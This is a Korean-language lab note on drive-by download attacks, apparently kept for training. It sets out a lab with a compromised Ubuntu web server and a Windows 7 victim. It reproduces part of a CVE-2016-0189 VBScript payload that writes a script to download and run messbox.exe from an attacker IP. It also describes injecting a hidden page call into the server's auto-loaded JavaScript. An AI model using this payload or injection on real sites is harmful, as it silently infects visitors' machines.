드라이브 바이 다운로드
- 사용자가 웹 페이지에 접속하는 것만으로, 별도의 메시지나 동의 없이 악성 스크립트가 자동으로 다운로드·실행되는 공격 기법.


|역할|OS|IP|
|---|---|---|
|피해 웹서버|Ubuntu|192.168.0.140|
|피해 PC (클라이언트)|Windows 7|192.168.0.6|
|공격자|Kali Linux|192.168.0.xxx|


시나리오
피해 서버에 공격자가 웹쉘을 업로드를 성공
웹쉘을 이용해서 웹서버 계정을 탈취
웹서버 계정에서 측면이동를 위해 권한 상승
root 권한을 이용하여 웹 서버에 악성 스크립트 주입

---

### 실습

![](Images/Pasted%20image%2020261120103046.png)


아래 스크립트를 실행시키도록 만든다.
해당 코드는 cve-2016-0189 취약점 코드를 기반으로 동작.


```js
105 Set Object = CreateObject("Shell.Application")  
106 Object.ShellExecute "cmd", "/c CD %TEMP%&@echo Set objXMLHTTP=CreateOb ject(""MSXML2.XMLHTTP"")>down_exec.vbs&@echo objXMLHTTP.open ""GET"",""[http://192](http://192). 168.0.138/messbox.exe"",false>>down_exec.vbs&@echo objXMLHTTP.send()>>down_exec.vb s&@echo If objXMLHTTP.Status=200 Then>>down_exec.vbs&@echo Set objADOStream=Create Object(""ADODB.Stream"")>>down_exec.vbs&@echo objADOStream.Open>>down_exec.vbs&@ec ho objADOStream.Type=1 >>down_exec.vbs&@echo objADOStream.Write objXMLHTTP.Respons eBody>>down_exec.vbs&@echo objADOStream.Position=0 >>down_exec.vbs&@echo objADOStr eam.SaveToFile ""%TEMP%\messbox.exe"">>down_exec.vbs&@echo objADOStream.Close>>dow n_exec.vbs&@echo Set objADOStream=Nothing>>down_exec.vbs&@echo End if>>down_exec.v bs&@echo Set objXMLHTTP=Nothing>>down_exec.vbs&@echo Set objShell=CreateObject(""W Script.Shell"")>>down_exec.vbs&@echo objShell.Exec(""%TEMP%\messbox.exe"")>>down_e xec.vbs&del %TEMP%\messbox.exe&cscript.exe %TEMP%\down_exec.vbs&del %TEMP%\down_ex ec.vbs", "", "open", 0  
107 End Function  
108  
109 Function triggerBug  
110 ' Resize array we are currently indexing
```


피해 웹 서버 안에서 불러오고 있는 js 파일 안에 'godmode.html' 파일을 불러오는 코드 작성을 한다. 실제로 웹 페이지 실행 시 자동으로 호출되는 여러 .js 중에서 하나에 심는다.


![](Images/Pasted%20image%2020261120112134.png)


위 파일의 맨 아래에 아래 스크립트 삽입
- 보이지 않는 html 호출을 유도
![](Images/Pasted%20image%2020261120111833.png)


공격자 port에서 80 open
![](Images/Pasted%20image%2020261120111739.png)



피해자가 해당 피해 서버에 접속하게 되면 dev.fngs.kr로 접속하게 되면 putty .exe로 실행되는 것을 볼 수 있다.


![](Images/녹음%202026-11-20%20112324.mp4)